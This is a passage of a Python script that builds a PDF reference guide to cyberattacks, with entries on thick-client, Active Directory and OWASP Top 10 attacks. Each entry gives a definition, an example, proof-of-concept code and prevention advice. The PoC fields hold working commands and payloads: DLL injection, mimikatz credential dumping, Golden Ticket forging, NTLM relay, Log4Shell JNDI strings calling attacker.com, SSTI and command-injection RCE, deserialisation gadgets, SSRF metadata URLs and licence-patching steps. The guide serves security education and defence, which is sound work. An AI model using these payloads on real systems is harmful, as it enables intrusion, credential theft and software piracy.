       simple_explain="Windows apps load helper files (DLLs). If you put a malicious DLL where an app expects to find a legitimate one — the app loads YOUR code and runs it with its own permissions. Like replacing a worker's tool with a bugged version.",
       example="Calculator app loads C:\\Users\\User\\Desktop\\version.dll (attacker-writable location). Attacker places malicious version.dll there. Next time calculator opens — malware runs under calc.exe process.",
       poc_code="""# DLL Injection with CreateRemoteThread:
// C++ DLL Injector (educational):
#include <windows.h>
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID addr = VirtualAllocEx(hProc, NULL, dllPathLen,
                              MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProc, addr, dllPath, dllPathLen, NULL);
CreateRemoteThread(hProc, NULL, 0,
    (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandle("kernel32.dll"), "LoadLibraryA"),
    addr, 0, NULL);

# DLL Hijacking (search order):
# Windows loads DLLs in order:
# 1. App directory, 2. System32, 3. Windows, 4. PATH
# Place evil.dll in app directory before System32 version

# Check with Procmon (Sysinternals):
# Filter: Result=NAME NOT FOUND, Path ends with .dll
# These are hijacking opportunities!

# Reflective DLL Injection (no disk touch):
# DLL loaded directly from memory - harder to detect""",
       prevention="Use absolute paths for DLL loading. Code signing for DLLs. DLL Safe Search Mode. Endpoint Detection & Response (EDR). Application whitelisting. Process integrity monitoring."),

  dict(num=2, title="Memory Tampering",
       severity="HIGH",
       definition="Memory tampering reads and modifies a running process's memory to manipulate game states, license checks, authentication tokens, or other in-memory values without persistent changes.",
       simple_explain="While a game runs, your score (e.g., 100 gold) is stored in RAM. Memory tampering tools scan RAM for '100', find its location, and change it to '999999'. The game doesn't know — it just reads from memory.",
       example="Game client checks license key in memory. Attacker uses Cheat Engine to scan process memory, find the 'isLicensed' boolean (value: 0), change it to 1. License check bypassed — full version unlocked.",
       poc_code="""# Memory analysis with Cheat Engine:
1. Open Cheat Engine → Select process (game.exe)
2. Scan for value (e.g., health = 100)
3. Take damage → health = 80
4. Scan for "80" among previous results
5. Repeat until 1-2 addresses remain
6. Right-click → Change value to 9999
7. Lock value (freeze memory)

# Python with ctypes (Windows):
import ctypes
PROCESS_ALL_ACCESS = 0x1F0FFF
proc = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
# Read memory:
buf = ctypes.create_string_buffer(4)
ctypes.windll.kernel32.ReadProcessMemory(proc, address, buf, 4, None)
# Write memory:
ctypes.windll.kernel32.WriteProcessMemory(proc, address, b'\x01', 1, None)

# Frida for memory manipulation:
$ frida -n "TargetApp.exe" -e "
  var addr = ptr('0x12345678');
  Memory.writeInt(addr, 9999);"
""",
       prevention="Encrypt sensitive in-memory values. Integrity checks (recompute expected values). Anti-cheat systems (Battleye, EAC). Server-side validation of all values. Obfuscate memory layout."),

  dict(num=3, title="License Bypass",
       severity="MEDIUM",
       definition="License bypass circumvents software licensing mechanisms — patching binary checks, reversing license algorithms, or modifying registry/file-based license storage to use paid features without purchasing.",
       simple_explain="Software checks 'Do you have a license?' at a specific code location. Attackers find that exact check in the binary, and change 'if not licensed → quit' to 'if not licensed → continue'. The check never triggers.",
       example="Software has: CMP EAX, 1 / JNZ exit (jump if not licensed). Attacker uses hex editor to change JNZ to NOP (no operation). Now even without license, the jump never happens — full features unlocked.",
       poc_code="""# License bypass methodology:

# 1. Static analysis with Ghidra/IDA Pro:
# Find license check function
# Look for: strcmp, RegQueryValueEx, license_valid()

# 2. Dynamic analysis with x64dbg:
# Run program, set breakpoint on license check
# Step through code, identify jump after check
# Modify: JE → JNE (flip the condition)

# 3. Patch binary:
# Hex editor: find instruction bytes
# JNZ = 0x75, JZ = 0x74 (near jumps)
# Change conditional jump to JMP (0xEB) = always jump

# 4. Registry license hack:
$ reg query HKCU\Software\TargetApp /v "LicenseKey"
$ reg add HKCU\Software\TargetApp /v "Licensed" /t REG_DWORD /d 1

# 5. DLL patching:
# Find license.dll → decompile → patch return value
# is_licensed() always returns TRUE""",
       prevention="Server-side license validation. Online activation with heartbeat. Code obfuscation and anti-tamper. Hardware fingerprinting. Encrypt license data. Regular integrity checks."),
]

# ── ACTIVE DIRECTORY ──────────────────────────────────────────────────────────
ad_attacks = [
  dict(num=1, title="Kerberoasting",
       severity="HIGH",
       definition="Kerberoasting requests Kerberos service tickets for service accounts with SPNs, then cracks them offline to recover plaintext passwords without admin rights.",
       simple_explain="In Windows AD, service tickets are encrypted with the service account's password. Any domain user can request these tickets! You request them, then crack offline. Like getting an encrypted safe to take home and crack at your leisure.",
       example="Attacker (regular domain user) runs Rubeus, requests TGS for SQLService account (has SPN). Gets Kerberos ticket encrypted with SQLService's NTLM hash. Cracks offline with hashcat in 2 hours. Gets SQLService:Summer2023!",
       poc_code="""# Kerberoasting with Impacket:
$ GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
# Outputs: $krb5tgs$23$*...* (crackable hash)

# With Rubeus (from domain-joined machine):
PS> .\Rubeus.exe kerberoast /output:hashes.txt

# Crack with hashcat:
$ hashcat -m 13100 hashes.txt rockyou.txt --force
# -m 13100 = Kerberos 5 TGS-REP (RC4)

# PowerShell:
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
    -ArgumentList "MSSQLSvc/dc01.domain.com:1433"

# AES Kerberoasting (harder to crack):
$ GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request \
  -outputfile hashes.txt""",
       prevention="Use Managed Service Accounts (gMSA) — 120-char random auto-rotating passwords. Audit accounts with SPNs. Detect high volume TGS requests. Kerberos AES-only enforcement."),

  dict(num=2, title="Pass-the-Hash (PtH)",
       severity="CRITICAL",
       definition="Pass-the-Hash allows attackers to authenticate using a captured NTLM hash instead of the plaintext password. NTLM accepts the hash directly without cracking it first.",
       simple_explain="NTLM authentication uses your password's hash to prove identity. The server sends a challenge — you prove you know the password by hashing it with the challenge. If attacker has the hash, they can answer the same challenge — no cracking needed!",
       example="Attacker dumps SAM database from compromised workstation. Gets Admin hash: aad3b435...31d6cfe. Uses it directly with psexec: psexec //fileserver -hashes :31d6cfe... cmd. Logs in as Admin — no password needed!",
       poc_code="""# Dump hashes with mimikatz:
mimikatz> privilege::debug
mimikatz> sekurlsa::logonpasswords
# Output: NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe...

# Pass-the-Hash with impacket:
$ psexec.py -hashes :NTLM_HASH domain/Administrator@target_ip
$ wmiexec.py -hashes :NTLM_HASH domain/Administrator@target_ip
$ smbexec.py -hashes :NTLM_HASH domain/Administrator@target_ip

# Evil-WinRM:
$ evil-winrm -i target_ip -u Administrator -H NTLM_HASH

# CrackMapExec (lateral movement):
$ cme smb 192.168.1.0/24 -u Administrator \
  -H :NTLM_HASH --local-auth

# Spray across network:
$ cme smb targets.txt -u admin -H :hash -x "whoami"

# Dump from lsass:
$ lsass_dump_method: procdump, comsvcs, nanodump""",
       prevention="Enable Protected Users security group. Disable NTLM where possible (use Kerberos). Credential Guard (isolates lsass). Local Administrator Password Solution (LAPS). Privileged Access Workstations (PAW)."),

  dict(num=3, title="NTLM Relay",
       severity="CRITICAL",
       definition="NTLM Relay captures NTLM authentication attempts and relays them to another target, allowing attackers to authenticate to other systems as the victim without knowing the password or hash.",
       simple_explain="NTLM relay is like identity theft in real-time. Victim's computer tries to authenticate to attacker (via LLMNR/NBNS poisoning). Attacker relays that authentication to a real server — logs in AS the victim.",
       example="Attacker poisons LLMNR. Victim PC looks up 'fileserver', gets attacker's IP. Victim sends NTLM auth to attacker. Attacker relays to Domain Controller — authenticates and runs DCSync as victim.",
       poc_code="""# NTLM Relay Attack with Responder + ntlmrelayx:

# 1. Disable SMB/HTTP in Responder (just capture, don't respond):
$ vim /opt/Responder/Responder.conf
# SMB = Off
# HTTP = Off

# 2. Start Responder (LLMNR/NBNS poisoning):
$ responder -I eth0 -rdwv

# 3. Start ntlmrelayx (relay to target):
$ ntlmrelayx.py -t smb://192.168.1.10 -smb2support
# Or dump SAM:
$ ntlmrelayx.py -t 192.168.1.10 --dump-sam
# Or run command:
$ ntlmrelayx.py -t 192.168.1.10 -c "net user hacker P@ss /add"

# 4. Wait for victim to browse network shares
# Their auth flows: victim → responder → target

# Mitm6 (IPv6 NTLM relay):
$ mitm6 -d domain.local
$ ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access""",
       prevention="Enable SMB signing (required). Disable NTLM where possible. Enable LDAP signing. Disable LLMNR and NetBIOS. Network segmentation. Disable IPv6 if unused."),

  dict(num=4, title="Golden Ticket Attack",
       severity="CRITICAL",
       definition="A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) signed with the KRBTGT account's hash. It grants unlimited access to any resource in the domain for 10+ years.",
       simple_explain="The KRBTGT account signs all tickets in Kerberos. If you steal its password hash, you can forge ANY ticket for ANY user — including Domain Admin — for any resource, for 10 years. Like stealing the master key template.",
       example="Attacker runs DCSync, gets KRBTGT hash. Forges Golden Ticket as 'Administrator' with 10-year validity. Even if real admin password changes — Golden Ticket still works (until KRBTGT password changes TWICE).",
       poc_code="""# Step 1: Get KRBTGT hash (requires DA privs):
mimikatz> lsadump::dcsync /domain:corp.local /user:krbtgt
# Get: NTLM hash of krbtgt account

# Also need: Domain SID
mimikatz> lsadump::lsa /patch

# Step 2: Forge Golden Ticket:
mimikatz> kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_NTLM_HASH \
  /id:500 \
  /groups:512 \
  /ticket:golden.kirbi

# Step 3: Import and use ticket:
mimikatz> kerberos::ptt golden.kirbi
# Now: klist (confirm ticket), then access any resource:
$ dir \\DC01\C$    # Full access!

# Via Impacket:
$ ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID \
  -domain corp.local Administrator""",
       prevention="Protect KRBTGT account (never interactive logon). Change KRBTGT password TWICE after compromise. Privileged Access Workstations. Monitor for forged tickets (impossible combinations). Microsoft ATA/Defender for Identity."),

  dict(num=5, title="Silver Ticket Attack",
       severity="HIGH",
       definition="A Silver Ticket is a forged Kerberos Service Ticket (TGS) for a specific service, signed with the service account's hash. More stealthy than Golden Ticket — bypasses the KDC entirely.",
       simple_explain="Like Golden Ticket but for one specific service. Forge a ticket directly to access SQL Server, SMB, or CIFS — without touching the Domain Controller at all. Much harder to detect since KDC isn't involved.",
       example="Attacker compromises SQLService account, gets its NTLM hash. Forges Silver Ticket for MSSQLSvc service. Accesses SQL Server as DBA — all without the DC knowing or logging the authentication.",
       poc_code="""# Silver Ticket Attack:
# Requires: Service account NTLM hash + Domain SID + SPN

# Step 1: Get service account hash:
mimikatz> sekurlsa::logonpasswords  # if service account logged in
# Or from SAM/registry if local service account

# Step 2: Forge Silver Ticket:
mimikatz> kerberos::golden \
  /user:DomainAdmin \
  /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX \
  /target:sqlserver.corp.local \
  /service:MSSQLSvc \
  /rc4:SERVICE_ACCOUNT_NTLM_HASH \
  /ticket:silver.kirbi

# Step 3: Use ticket:
mimikatz> kerberos::ptt silver.kirbi
# Access: sqlcmd -S sqlserver.corp.local

# Common service SPNs to target:
# cifs/server     → file shares
# http/server     → web services
# MSSQLSvc/server → SQL Server
# HOST/server     → PSExec, WMI""",
       prevention="Managed Service Accounts (random 120-char passwords). Monitor service account privilege use. Privileged Access Management (PAM). Kerberos PAC validation. Defender for Identity anomaly detection."),

  dict(num=6, title="DCSync Attack",
       severity="CRITICAL",
       definition="DCSync mimics a Domain Controller replication request to extract password hashes for any account from Active Directory, without running code on the DC itself.",
       simple_explain="Domain Controllers sync with each other to share account info. If you have enough permissions, you can pretend to be a DC and ask 'give me all passwords for replication'. The DC complies — thinking you're a legitimate DC peer.",
       example="Attacker compromises account with Replication-Get-Changes-All privilege. Runs mimikatz DCSync — extracts NTLM hashes for ALL domain users including krbtgt and Administrator. Game over for the domain.",
       poc_code="""# DCSync with Mimikatz:
# Requires: Replication-Get-Changes + Replication-Get-Changes-All

# Dump specific user:
mimikatz> lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz> lsadump::dcsync /domain:corp.local /user:krbtgt

# Dump ALL hashes:
mimikatz> lsadump::dcsync /domain:corp.local /all /csv

# With Impacket (remote, no mimikatz needed):
$ secretsdump.py domain/user:password@DC_IP
$ secretsdump.py -hashes :NTLM_HASH domain/user@DC_IP

# Check who has replication rights:
PS> Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "DS-Replication"}

# BloodHound to find path to DCSync:
$ bloodhound-python -d corp.local -u user -p pass -c DCOnly""",
       prevention="Restrict replication rights (audit regularly). Monitor for replication requests from non-DC machines. Microsoft Defender for Identity alert. Tier-0 account protection. PAW for AD administration."),
]

# ── OWASP TOP 10 ──────────────────────────────────────────────────────────────
owasp_attacks = [
  dict(num=1, title="A01: Broken Access Control",
       severity="CRITICAL",
       definition="The #1 OWASP risk. Access control enforces policy so users cannot act outside their intended permissions. Failures lead to unauthorised information disclosure, modification, or destruction.",
       simple_explain="A regular employee shouldn't see the CEO's salary. If your web app doesn't properly check permissions before showing data — anyone can access anything. Most common web vulnerability today.",
       example="E-commerce admin panel at /admin — no auth check. Any user who knows the URL can access all orders, customer data, and can delete products. Developers forgot to add authorization middleware.",
       poc_code="""# Test broken access control:
# 1. Force browsing to restricted paths:
GET /admin/users
GET /api/v1/admin/settings
GET /internal/reports

# 2. Method tampering:
GET /api/posts/delete/5  → returns 403
DELETE /api/posts/5      → might work!

# 3. Privilege escalation via parameter:
POST /api/update {"role": "admin"}

# 4. JWT claim manipulation:
# Decode JWT, change role: "user" → "admin", re-encode

# OWASP Testing Guide:
- Test ALL endpoints with different roles
- Document what each role SHOULD access
- Verify each endpoint enforces it
- Automated: use Burp Suite with two accounts""",
       prevention="Deny by default. Enforce ACL server-side on every request. Log access control failures. Rate limit APIs. Disable directory listing. Invalidate tokens on logout."),

  dict(num=2, title="A02: Cryptographic Failures",
       severity="HIGH",
       definition="Failure to properly protect data in transit or at rest. Using weak algorithms (MD5, SHA1), insufficient key lengths, improper key management, or transmitting sensitive data in cleartext.",
       simple_explain="Using MD5 to store passwords is like putting a 'no trespassing' sign on a glass door. Looks like protection but cracked instantly. Proper encryption is a real steel vault.",
       example="App stores passwords as MD5 hashes. Database leaked — hacker runs hashcat against rockyou.txt. 90% of hashes cracked in minutes. Millions of accounts compromised because of weak hashing.",
       poc_code="""# Testing cryptographic failures:
# 1. Check if HTTPS is enforced:
$ curl -vk http://target.com  # Should redirect to HTTPS

# 2. SSL/TLS configuration:
$ testssl.sh target.com
$ nmap --script ssl-enum-ciphers -p 443 target.com
# Look for: SSLv2, SSLv3, TLS 1.0, RC4, DES, MD5

# 3. Check password hashing:
# MD5: $1$... (32 hex chars) → WEAK
# SHA1: 40 hex chars → WEAK
# bcrypt: $2b$... → GOOD
# Argon2: $argon2... → BEST

# 4. Crack weak hashes:
$ hashcat -m 0 hashes.txt rockyou.txt   # MD5
$ hashcat -m 100 hashes.txt rockyou.txt # SHA1
$ john --format=raw-md5 hashes.txt --wordlist=rockyou.txt

# 5. Test for hardcoded secrets:
$ strings binary | grep -iE "key|secret|password|token" """,
       prevention="Use AES-256, TLS 1.2+. bcrypt/Argon2 for passwords. Proper key management (HSM). Disable weak ciphers. HSTS. Encrypt all PII at rest. No sensitive data in URLs."),

  dict(num=3, title="A03: Injection",
       severity="CRITICAL",
       definition="Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. SQL, NoSQL, OS Command, LDAP, and SSTI are all injection types.",
       simple_explain="Any time your app takes input and uses it inside a command/query without cleaning it first — an attacker can change the meaning of that command. Input becomes code.",
       example="Search: 'SELECT * FROM products WHERE name = ''' + input + ''''. Attacker types: ' UNION SELECT username,password FROM users--. Gets all credentials.",
       poc_code="""# SQL Injection test:
' OR '1'='1
' OR 1=1--
'; SELECT sleep(5)--   (time-based)

# NoSQL Injection:
{"username": {"$ne": null}, "password": {"$ne": null}}

# Server-Side Template Injection (SSTI):
{{7*7}}        → Jinja2/Twig: renders 49 → VULNERABLE
${7*7}         → FreeMarker/Velocity
<%= 7*7 %>     → EJS/ERB

# SSTI RCE (Jinja2):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Command Injection:
; id
| whoami
`id`
$(id)

# XPath Injection:
' or '1'='1   (' or 1=1 selects all nodes)
' or ''='

# Automated scanning:
$ sqlmap -u "url?param=1" --batch --dbs
$ commix --url "url" --data "param=value" """,
       prevention="Parameterised queries everywhere. ORM usage. Input validation. Whitelist-based validation. OWASP ESAPI. WAF deployment. Least-privilege DB accounts."),

  dict(num=4, title="A04: Insecure Design",
       severity="HIGH",
       definition="Insecure design represents missing or ineffective security controls in the design phase. Unlike implementation bugs, design flaws require redesign — not patching.",
       simple_explain="If a house architect plans no locks on doors — adding locks later is hard. Software designed without security in mind has fundamental weaknesses no code patch fully fixes.",
       example="Password reset: sends OTP to email, OTP is 4-digit, valid 24 hours. Design flaw: 10,000 possible combinations + 24 hours = trivially brute-forced. No code bug — the design itself is insecure.",
       poc_code="""# Insecure Design Examples:

# 1. Weak OTP design:
# 4-digit OTP = 10,000 combinations
# 24-hour expiry = rate limit 10/min = only 14,400 attempts needed
# All 10,000 tried in ~17 hours → account takeover

# 2. "Security question" design:
# "Mother's maiden name" found on Facebook
# Trivially answered by attacker → password reset bypassed

# 3. No rate limiting design:
for i in range(10000):
    requests.post('/forgot-password/verify',
                  json={'otp': str(i).zfill(4)})

# 4. Predictable tokens:
# Password reset token = timestamp + username → predictable

# 5. Business logic flaw:
# Cart: add item at $100, apply coupon → price = $0
# Remove item → coupon stays → add expensive item → still $0!""",
       prevention="Threat modeling in design phase. Security requirements alongside functional requirements. Reference secure design patterns. Red team design reviews. Defense in depth from day one."),

  dict(num=5, title="A05: Security Misconfiguration",
       severity="HIGH",
       definition="The most commonly seen issue — insecure default configurations, incomplete configurations, open cloud storage, misconfigured HTTP headers, verbose error messages.",
       simple_explain="Buying a router and never changing the default admin/admin password. Everything technically works — but it's wide open. Most breaches come from basic misconfiguration, not sophisticated 0-days.",
       example="Spring Boot Actuator left enabled in production. /actuator/env exposes ALL environment variables including database passwords. /actuator/heapdump gives full memory dump with secrets.",
       poc_code="""# Common misconfiguration checks:
# 1. HTTP Security Headers:
$ curl -I https://target.com | grep -E \
  "X-Frame|X-XSS|Content-Security|HSTS|X-Content"

# 2. Default credentials:
admin/admin, admin/password, root/root, guest/guest
# Routers: 192.168.1.1 admin/admin

# 3. Sensitive files:
/.env, /.git/, /backup.zip, /config.php.bak
/phpinfo.php, /server-status, /server-info

# 4. Spring Boot Actuator:
/actuator, /actuator/env, /actuator/beans
/actuator/heapdump → full memory dump!

# 5. AWS misconfiguration:
$ aws s3 ls s3://bucket-name --no-sign-request
$ curl http://169.254.169.254/latest/meta-data/  (from EC2)

# 6. Cloud metadata:
$ nmap -sV --script=http-config-backup target.com
$ nikto -h target.com""",
       prevention="Automated configuration management. CIS Benchmarks. Disable unused features. Minimal installations. Change all defaults. Regular security scanning (Lynis, ScoutSuite for cloud)."),

  dict(num=6, title="A06: Vulnerable and Outdated Components",
       severity="HIGH",
       definition="Using components with known vulnerabilities (outdated libraries, frameworks, OS) creates risk. If you don't know your component versions, you can't patch them.",
       simple_explain="Using Log4Shell (CVE-2021-44228) as example: millions of apps used Log4j library. One bug in that library = all those apps critical vulnerabilities. Like a defective lock used in millions of doors.",
       example="App using Apache Log4j 2.14.1. Attacker sends: ${jndi:ldap://attacker.com/exploit} in User-Agent header. Log4j processes it, fetches attacker's LDAP — executes malicious code. Full RCE with zero authentication.",
       poc_code="""# Identify vulnerable components:
# Check versions:
$ mvn dependency:tree          # Java/Maven
$ pip list --outdated          # Python
$ npm audit                    # Node.js
$ composer show --outdated     # PHP

# Log4Shell PoC (CVE-2021-44228):
# Payload in any logged field:
${jndi:ldap://attacker.com:1389/exploit}
${${lower:j}ndi:ldap://attacker.com/x}  # bypass filter
${jndi:rmi://attacker.com/exploit}

# Check with nuclei:
$ nuclei -t cves/ -u https://target.com

# Retire.js (client-side vulnerable libraries):
$ retire --js --path ./webapp/js

# OWASP Dependency Check:
$ dependency-check --scan ./project --out ./report""",
       prevention="Inventory all components and versions. Monitor CVE feeds. Automated dependency updates (Dependabot). Remove unused dependencies. Virtual patching via WAF for critical CVEs."),

  dict(num=7, title="A07: Identification and Authentication Failures",
       severity="HIGH",
       definition="Weaknesses in authentication and session management — weak passwords, missing MFA, weak session tokens, improper logout — that allow attackers to compromise credentials or sessions.",
       simple_explain="A bank with a 4-digit PIN, no lockout, and session that never expires is trivially attacked. Proper authentication requires: strong factors, lockout policies, secure session management, and MFA.",
       example="App allows 4-character passwords with no lockout. Uses sequential session IDs (session=10001, 10002). Attacker brutes force both — finds password 'bank' in seconds, and guesses nearby session IDs to hijack active sessions.",
       poc_code="""# Authentication testing:
# 1. Username enumeration:
POST /login {"user":"admin","pass":"wrong"}
→ "User not found" vs "Wrong password"  ← username confirmed!

# 2. Password policy test:
Try: a, 1, " ", password, abc123 → all accepted? Weak policy!

# 3. Session fixation:
# Note Session ID before login
# Log in
# Check Session ID after login → same? VULNERABLE

# 4. Session after logout:
$ curl -H "Cookie: SESSION=old_id" /api/profile
# If still works after logout → sessions not invalidated!

# 5. JWT none algorithm attack:
# Decode JWT header, change alg to "none"
# Remove signature
# Server accepts token without validation → auth bypass!

# 6. Password reset link still valid after use:
# Use reset link twice → if works second time → vulnerable""",
       prevention="MFA everywhere. Minimum password length 12+. Bcrypt/Argon2 password hashing. Account lockout. Invalidate sessions on logout. Secure random session tokens. No session in URLs."),

  dict(num=8, title="A08: Software and Data Integrity Failures",
       severity="HIGH",
       definition="Failures related to code and infrastructure that doesn't protect against integrity violations — insecure CI/CD pipelines, auto-update without signature verification, deserialisation of untrusted data.",
       simple_explain="If your app auto-updates from a server without checking the update is genuine — an attacker who compromises that server can push malware to all users. Like accepting packages without checking who sent them.",
       example="SolarWinds supply chain attack: attackers compromised SolarWinds' build system. Malicious code added to legitimate Orion software update. 18,000+ organisations installed the update — all compromised.",
       poc_code="""# Insecure Deserialisation (Java):
# Gadget chain to RCE:
$ ysoserial.jar CommonsCollections1 'id' | base64

# PHP Object Injection:
O:8:"UserData":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
# Change isAdmin to 1 → inject serialised admin object

# Node.js (node-serialize):
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()"}

# CI/CD Attack Surface:
# - Malicious dependency in package.json
# - Tampered build artifacts
# - Compromised GitHub Actions runner

# Check deserialisation:
# Java: serialised data starts with 0xACED0005
$ echo "rO0..." | base64 -d | xxd | head

# npm audit for supply chain:
$ npm audit
$ npm-audit-ci --critical""",
       prevention="Digital signatures for all updates and packages. Verify checksums. Secure CI/CD with SAST/DAST. Don't deserialise untrusted data. Software Bill of Materials (SBOM). Dependency pinning."),

  dict(num=9, title="A09: Security Logging and Monitoring Failures",
       severity="MEDIUM",
       definition="Insufficient logging and monitoring means attacks go undetected. Without proper logs, you can't detect breaches, trace attacker activity, or respond to incidents effectively.",
       simple_explain="If a burglar breaks into your house but you have no cameras, no alarm, and no visitor log — you won't know until they've already left with everything. Logging is your security camera. Monitoring is the alarm.",
       example="Company breached — attacker had access for 287 days before detection (Verizon average). Why? No SIEM, authentication failures not logged, no alerts on unusual data access. Logs existed but nobody watched them.",
       poc_code="""# Test logging and monitoring:
# 1. What should be logged:
- Authentication attempts (success AND failure)
- Access to sensitive resources
- Account lockouts / password resets
- Admin actions
- API errors (4xx, 5xx)

# 2. Testing if failures are logged:
# Make 10 failed logins → check if alert triggered
# Access /admin without auth → check if logged
# Run SQLi payload → WAF block logged?

# 3. Log injection attack (if logs not sanitised):
username: admin\nINFO: User admin logged in successfully
# Forges log entries!

# 4. Check logging coverage:
# Is there a SIEM? (Splunk, ELK, Sentinel)
# Are logs retained 90+ days?
# Is there 24/7 alerting?

# 5. Verify alert thresholds:
# 1000 failed logins per minute → alert?
# Data export of 10GB → alert?
# Login from new country → alert?""",
       prevention="Centralised SIEM. Log all auth events. Alert on threshold violations. Tamper-evident logs. 90+ day log retention. Incident response plan. Regular log review. User behaviour analytics (UEBA)."),

  dict(num=10, title="A10: Server-Side Request Forgery (SSRF)",
       severity="HIGH",
       definition="SSRF forces the server to make HTTP requests to an unintended location. Modern apps in cloud environments are especially vulnerable as SSRF can access internal metadata services and internal APIs.",
       simple_explain="You ask the server: 'Please fetch this URL for me'. You give it an internal URL (like 169.254.169.254 for AWS metadata). The server fetches it from inside its secure network and gives you the result.",
       example="Webhook URL feature: 'We'll POST to your URL on events'. Attacker sets URL to http://169.254.169.254/latest/meta-data/iam/security-credentials/. Server POSTs there, metadata returns cloud credentials in response.",
       poc_code="""# SSRF payloads:
# Target internal services:
http://localhost/admin
http://127.0.0.1:8080/actuator
http://10.0.0.1/internal-api

# Cloud metadata endpoints:
# AWS:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP:
http://metadata.google.internal/computeMetadata/v1/
-H "Metadata-Flavor: Google"

# Azure:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
-H "Metadata: true"

# SSRF Bypass:
http://0x7f000001    (127.0.0.1 in hex)
http://2130706433    (127.0.0.1 in decimal)
http://127.1         (short form)
http://[::1]         (IPv6 localhost)
http://spoofed.com   (DNS resolves to 127.0.0.1)

# Blind SSRF detection:
http://your-burp-collaborator.net""",
       prevention="Allowlist permitted URL schemes and destinations. Disable redirects. Block private IP ranges in requests. Network segmentation. IMDSv2 for AWS (requires session token). Cloud-native SSRF protection."),
]

# Assemble categories
attacks = [
    ("CLIENT-SIDE ATTACKS", C_RED, "🌐", client),
    ("INJECTION ATTACKS", C_ORANGE, "💉", injection),
    ("AUTHENTICATION ATTACKS", C_YELLOW, "🔐", auth_attacks),
    ("ACCESS CONTROL ATTACKS", C_GREEN, "🚪", access_ctrl),
    ("FILE RELATED ATTACKS", C_BLUE, "📁", file_attacks),
    ("NETWORK ATTACKS", C_PURPLE, "🌍", network_attacks),
    ("API ATTACKS", C_ORANGE, "⚡", api_attacks),
    ("CLOUD & INFRASTRUCTURE", C_RED, "☁", cloud_attacks),
    ("WIRELESS ATTACKS", C_BLUE, "📡", wireless_attacks),
    ("MOBILE APPLICATION ATTACKS", C_GREEN, "📱", mobile_attacks),
    ("THICK CLIENT ATTACKS", C_YELLOW, "💻", thick_attacks),
    ("ACTIVE DIRECTORY ATTACKS", C_RED, "🏢", ad_attacks),
    ("OWASP TOP 10", C_ORANGE, "🔟", owasp_attacks),
]

# ════════════════════════════════════════════════════════════════════════════
#  BUILD DOCUMENT
# ════════════════════════════════════════════════════════════════════════════

story = []

# ── COVER PAGE ───────────────────────────────────────────────────────────────
story.append(sp(3))
story.append(ColorBox(C_DARK, height=3*cm,
    text="🛡  CYBERSECURITY ATTACKS", font_size=22,
    text_color=C_RED, radius=0))
story.append(sp(0.3))
story.append(ColorBox(colors.HexColor("#161B22"), height=1.5*cm,
    text="COMPLETE REFERENCE GUIDE", font_size=14,
    text_color=C_LIGHT, radius=0))
story.append(sp(0.5))

# Stats table
stats = [
    ["📊 COVERAGE", "13 Categories", "60+ Attack Types", "OWASP Top 10"],
]
stats_table = Table(stats, colWidths=[4*cm, 4*cm, 4*cm, 4*cm])
stats_table.setStyle(TableStyle([
    ("BACKGROUND", (0,0), (0,-1), C_RED),
    ("BACKGROUND", (1,0), (-1,-1), C_BG_CARD),
    ("TEXTCOLOR", (0,0), (-1,-1), C_WHITE),
    ("FONTNAME", (0,0), (-1,-1), "Helvetica-Bold"),
    ("FONTSIZE", (0,0), (-1,-1), 10),
    ("ALIGN", (0,0), (-1,-1), "CENTER"),
    ("VALIGN", (0,0), (-1,-1), "MIDDLE"),
    ("ROWHEIGHT", (0,0), (-1,-1), 0.7*cm),
    ("GRID", (0,0), (-1,-1), 0.5, C_GRAY),
]))
story.append(stats_table)
story.append(sp(1))

# Quick legend
legend_data = [
    [badge("⚠ CRITICAL", C_RED), badge("⚠ HIGH", C_ORANGE),
     badge("⚠ MEDIUM", C_YELLOW), badge("⚠ LOW", C_GREEN)],
]
lt = Table(legend_data, colWidths=[4*cm]*4)
lt.setStyle(TableStyle([("ALIGN",(0,0),(-1,-1),"CENTER"),
                         ("VALIGN",(0,0),(-1,-1),"MIDDLE")]))
story.append(lt)
story.append(sp(0.5))

story.append(Paragraph("Each attack includes: Definition • Simple Explanation • Real Example • PoC Code • Prevention",
                        ParagraphStyle("cv", fontSize=10, textColor=C_LIGHT,
                                       fontName="Helvetica-Oblique",
                                       alignment=TA_CENTER)))
story.append(sp(0.5))
story.append(hr(C_RED))
story.append(Paragraph("⚠  FOR EDUCATIONAL AND AUTHORISED SECURITY TESTING ONLY",
                        ParagraphStyle("warn", fontSize=9, textColor=C_ORANGE,
                                       fontName="Helvetica-Bold",
                                       alignment=TA_CENTER)))
story.append(PageBreak())

# ── TABLE OF CONTENTS ─────────────────────────────────────────────────────────
story.append(ColorBox(C_DARK, 1.0*cm, "📋  TABLE OF CONTENTS", font_size=14))
story.append(sp(0.3))
for cat_title, cat_color, cat_icon, cat_attacks in attacks:
    story.append(Paragraph(
        f'<font color="{cat_color.hexval()}"><b>{cat_icon} {cat_title}</b></font>',
        sTOC))
    for a in cat_attacks:
        story.append(Paragraph(
            f'    {a["num"]}. {a["title"]}',
            sTOCSub))
story.append(PageBreak())

# ── CONTENT ───────────────────────────────────────────────────────────────────
CAT_ACCENT_MAP = {
